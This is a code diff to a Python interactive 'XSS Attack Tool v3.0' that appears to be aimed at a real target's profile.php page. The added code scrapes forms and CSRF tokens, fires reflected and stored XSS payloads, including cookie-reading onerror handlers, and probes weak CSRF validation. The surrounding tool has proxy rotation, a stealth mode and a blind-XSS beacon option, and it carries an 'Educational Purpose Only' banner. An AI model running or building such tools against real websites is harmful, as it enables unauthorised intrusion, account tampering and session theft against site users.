@@ -16,7 +16,7 @@ import os
 import sys
 import argparse
 import platform
-from urllib.parse import urlparse, parse_qs, urlencode
+from urllib.parse import urlparse, parse_qs, urlencode, quote
 import threading
 from colorama import init, Fore, Back, Style
 import socks
@@ -73,7 +73,7 @@ class XSSAttackToolV3:
             # 'http://proxy1.com:8080',
             # 'http://proxy2.com:3128',
             # # 실제 작동하는 프록시로 교체 필요
-            'http://3.38.101.138:48293'
+            # 'http://3.38.101.138:48293'
         ]
         self.current_proxy = 0
         
@@ -178,7 +178,7 @@ class XSSAttackToolV3:
         banner = f"""
 {Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
 ║               XSS Attack Tool v3.0 - Interactive Mode        ║
-║                    Educational Purpose Only!                  ║
+║                    Educational Purpose Only!                 ║
 ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
 
 {Fore.YELLOW}Target:{Style.RESET_ALL} {self.target_url}
@@ -254,6 +254,7 @@ class XSSAttackToolV3:
 {Fore.YELLOW}[10]{Style.RESET_ALL} Reflected XSS Scanner     - Scan for reflected XSS
 {Fore.YELLOW}[11]{Style.RESET_ALL} Blind XSS Payload         - Deploy blind XSS beacon
 {Fore.YELLOW}[12]{Style.RESET_ALL} Generate Report           - Create attack report
+{Fore.YELLOW}[13]{Style.RESET_ALL} Profile.php XSS Test       - Comprehensive profile page testing
 
 {Fore.MAGENTA}[P]{Style.RESET_ALL} Rotate Proxy               - Switch to next proxy
 {Fore.MAGENTA}[S]{Style.RESET_ALL} Toggle Stealth Mode        - Current: {'ON' if self.stealth_mode else 'OFF'}
@@ -789,6 +790,8 @@ Successful Payloads ({len(self.successful_payloads)}):
                 self.blind_xss_payload()
             elif choice == '12':
                 self.generate_report()
+            elif choice == '13':
+                self.profile_xss_test()
             elif choice == 'P':
                 self.get_new_proxy()
             elif choice == 'S':
@@ -802,6 +805,259 @@ Successful Payloads ({len(self.successful_payloads)}):
                 print(f"{Fore.RED}Invalid option!{Style.RESET_ALL}")
             
             input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
+
+    def profile_xss_test(self):
+        """프로필 페이지 XSS 종합 테스트"""
+        print(f"\n{Fore.CYAN}[*] Testing Profile.php XSS vulnerabilities...{Style.RESET_ALL}")
+        
+        profile_url = f"{self.target_url}/profile.php"
+        
+        # 1. 프로필 구조 분석
+        self.analyze_profile_structure(profile_url)
+        
+        # 2. GET 파라미터 Reflected XSS 테스트
+        self.test_profile_reflected_xss(profile_url)
+        
+        # 3. POST를 통한 Stored XSS 테스트
+        self.test_profile_stored_xss(profile_url)
+        
+        # 4. CSRF 토큰 검증 테스트
+        self.test_csrf_validation(profile_url)
+
+    def analyze_profile_structure(self, profile_url):
+        """프로필 페이지 구조 분석"""
+        try:
+            response = self.make_request(profile_url, method='GET')
+            if not response:
+                return
+                
+            soup = BeautifulSoup(response.text, 'html.parser')
+            
+            print(f"\n{Fore.YELLOW}[*] Profile page structure analysis:{Style.RESET_ALL}")
+            
+            # 모든 form 찾기
+            forms = soup.find_all('form')
+            for i, form in enumerate(forms):
+                print(f"\n{Fore.GREEN}Form {i+1}:{Style.RESET_ALL}")
+                print(f"  Action: {form.get('action', 'self')}")
+                print(f"  Method: {form.get('method', 'GET')}")
+                
+                # 입력 필드 찾기
+                inputs = form.find_all(['input', 'textarea', 'select'])
+                for inp in inputs:
+                    input_type = inp.get('type', 'text')
+                    input_name = inp.get('name', 'unnamed')
+                    input_value = inp.get('value', '')[:50] + '...' if inp.get('value') else ''
+                    
+                    if input_type != 'hidden' or input_name == 'csrf_token':
+                        print(f"  - {inp.name} [{input_type}] name='{input_name}' value='{input_value}'")
+            
+            # URL에서 반영되는 파라미터 찾기
+            print(f"\n{Fore.YELLOW}[*] Testing parameter reflection:{Style.RESET_ALL}")
+            test_string = "UNIQUE_TEST_STRING_12345"
+            
+            for param in ['email', 'full_name', 'bio', 'id', 'user', 'username']:
+                test_url = f"{profile_url}?{param}={test_string}"
+                test_response = self.make_request(test_url, method='GET')
+                
+                if test_response and test_string in test_response.text:
+                    # 어디에 반영되는지 찾기
+                    contexts = []
+                    if f'value="{test_string}"' in test_response.text:
+                        contexts.append('input_value')
+                    if f'>{test_string}<' in test_response.text:
+                        contexts.append('html_content')
+                    if f"'{test_string}'" in test_response.text:
+                        contexts.append('javascript')
+                        
+                    print(f"{Fore.GREEN}  - {param}: Reflected in {contexts}{Style.RESET_ALL}")
+                    
+        except Exception as e:
+            print(f"{Fore.RED}[-] Error analyzing profile: {e}{Style.RESET_ALL}")
+
+    def test_profile_reflected_xss(self, profile_url):
+        """프로필 페이지 GET 파라미터 XSS 테스트"""
+        print(f"\n{Fore.YELLOW}[*] Testing Reflected XSS via GET parameters...{Style.RESET_ALL}")
+        
+        # 실제 존재하는 사용자의 프로필 페이지 형식으로 테스트
+        test_params = {
+            'email': [
+                'test@test.com<script>alert(1)</script>',
+                'test@test.com"><script>alert(1)</script>',
+                'test@test.com\' onmouseover=alert(1) x=\'',
+            ],
+            'full_name': [
+                'John<img src=x onerror=alert(1)>Doe',
+                'Test"><svg onload=alert(1)>',
+                'Name\' onmouseover=\'alert(1)\'//\'',
+            ],
+            'bio': [
+                '<script>alert(1)</script>',
+                '<img src=x onerror=alert(document.cookie)>',
+                '<iframe src=javascript:alert(1)>',
+            ]
+        }
+        
+        for param, payloads in test_params.items():
+            for payload in payloads:
+                test_url = f"{profile_url}?{param}={quote(payload)}"
+                try:
+                    response = self.make_request(test_url, method='GET')
+                    
+                    if response and (payload in response.text or payload.replace('<', '&lt;').replace('>', '&gt;') in response.text):
+                        # 실제로 실행 가능한지 확인
+                        soup = BeautifulSoup(response.text, 'html.parser')
+                        
+                        # value 속성에 있는지 확인
+                        vulnerable = False
+                        for input_tag in soup.find_all('input'):
+                            if payload in str(input_tag.get('value', '')):
+                                print(f"{Fore.GREEN}[+] VULNERABLE - Reflected in INPUT value!{Style.RESET_ALL}")
+                                print(f"    Parameter: {param}")
+                                print(f"    Payload: {payload}")
+                                vulnerable = True
+                                self.vulnerabilities.append({
+                                    'type': 'Reflected XSS in attribute',
+                                    'url': profile_url,
+                                    'parameter': param,
+                                    'payload': payload,
+                                    'context': 'input_value'
+                                })
+                                break
+                        
+                        # HTML 컨텐츠에 직접 반영되는지
+                        if not vulnerable and payload.replace('&lt;', '<').replace('&gt;', '>') in response.text:
+                            print(f"{Fore.YELLOW}[*] Potential XSS - {param} reflects user input{Style.RESET_ALL}")
+                            
+                except Exception as e:
+                    print(f"{Fore.RED}[-] Error testing {param}: {e}{Style.RESET_ALL}")
+                
+                self.smart_delay()
+
+    def test_profile_stored_xss(self, profile_url):
+        """프로필 페이지 POST Stored XSS 테스트"""
+        print(f"\n{Fore.YELLOW}[*] Testing Stored XSS via POST update...{Style.RESET_ALL}")
+        
+        # 먼저 현재 CSRF 토큰 가져오기
+        try:
+            profile_page = self.make_request(profile_url, method='GET')
+            if not profile_page:
+                return
+                
+            soup = BeautifulSoup(profile_page.text, 'html.parser')
+            
+            # CSRF 토큰 찾기
+            csrf_input = soup.find('input', {'name': 'csrf_token'})
+            csrf_token = csrf_input.get('value') if csrf_input else ''
+            
+            print(f"  - Found CSRF token: {csrf_token[:20]}...")
+            
+            # POST 데이터로 프로필 업데이트 시도
+            xss_payloads = [
+                {
+                    'update_profile': '1',
+                    'csrf_token': csrf_token,
+                    'email': 'test@test.com',
+                    'full_name': 'Test<script>alert("XSS")</script>User',
+                    'bio': '<img src=x onerror=alert(document.cookie)>'
+                },
+                {
+                    'update_profile': '1',
+                    'csrf_token': csrf_token,
+                    'email': 'test"><script>alert(1)</script>@test.com',
+                    'full_name': 'Normal Name',
+                    'bio': 'Normal bio'
+                },
+                {
+                    'update_profile': '1',
+                    'csrf_token': csrf_token,
+                    'email': 'test@test.com',
+                    'full_name': 'Normal',
+                    'bio': '"><svg onload=alert(1)>'
+                }
+            ]
+            
+            for i, payload_data in enumerate(xss_payloads):
+                print(f"\n{Fore.YELLOW}Testing payload set {i+1}...{Style.RESET_ALL}")
+                
+                response = self.make_request(profile_url, method='POST', data=payload_data)
+                
+                if response and response.status_code != 403:
+                    # 업데이트 후 다시 GET으로 확인
+                    time.sleep(1)
+                    check_response = self.make_request(profile_url, method='GET')
+                    
+                    if check_response:
+                        for field in ['email', 'full_name', 'bio']:
+                            if field in payload_data and '<' in payload_data[field]:
+                                if payload_data[field] in check_response.text:
+                                    print(f"{Fore.RED}[HIGH RISK - Stored XSS] {field}: {payload_data[field]}{Style.RESET_ALL}")
+                                    self.vulnerabilities.append({
+                                        'type': 'Stored XSS',
+                                        'url': profile_url,
+                                        'field': field,
+                                        'payload': payload_data[field],
+                                        'severity': 'HIGH'
+                                    })
+                                    self.successful_payloads.append(payload_data[field])
+                
+                self.smart_delay()
+                            
+        except Exception as e:
+            print(f"{Fore.RED}[-] Error testing POST: {e}{Style.RESET_ALL}")
+
+    def test_csrf_validation(self, profile_url):
+        """CSRF 토큰 검증 약점 테스트"""
+        print(f"\n{Fore.YELLOW}[*] Testing CSRF token validation...{Style.RESET_ALL}")
+        
+        try:
+            # 먼저 유효한 토큰 가져오기
+            profile_page = self.make_request(profile_url, method='GET')
+            if not profile_page:
+                return
+                
+            soup = BeautifulSoup(profile_page.text, 'html.parser')
+            csrf_input = soup.find('input', {'name': 'csrf_token'})
+            valid_token = csrf_input.get('value') if csrf_input else ''
+            
+            # 잘못된 CSRF 토큰으로 시도
+            test_tokens = [
+                ('Empty token', ''),
+                ('Invalid token', 'invalid_token_12345'),
+                ('Modified token', valid_token[:-5] + 'xxxxx' if valid_token else 'xxxxx'),
+                ('No token', None)  # 토큰 필드 자체를 제거
+            ]
+            
+            for token_name, test_token in test_tokens:
+                print(f"\n{Fore.YELLOW}Testing {token_name}...{Style.RESET_ALL}")
+                
+                test_data = {
+                    'update_profile': '1',
+                    'bio': 'CSRF test - ' + token_name
+                }
+                
+                if test_token is not None:
+                    test_data['csrf_token'] = test_token
+                
+                response = self.make_request(profile_url, method='POST', data=test_data)
+                
+                if response and ('success' in response.text.lower() or 
+                            response.status_code == 200 or 
+                            'updated' in response.text.lower()):
+                    print(f"{Fore.RED}[VULNERABLE - CSRF] Weak token validation with {token_name}!{Style.RESET_ALL}")
+                    self.vulnerabilities.append({
+                        'type': 'CSRF',
+                        'url': profile_url,
+                        'issue': f'Accepts {token_name}',
+                        'severity': 'HIGH'
+                    })
+                else:
+                    print(f"{Fore.GREEN}[+] Properly rejected {token_name}{Style.RESET_ALL}")
+                    
+                self.smart_delay()
+                    
+        except Exception as e:
+            print(f"{Fore.RED}[-] Error testing CSRF: {e}{Style.RESET_ALL}")
 
 
 def main():
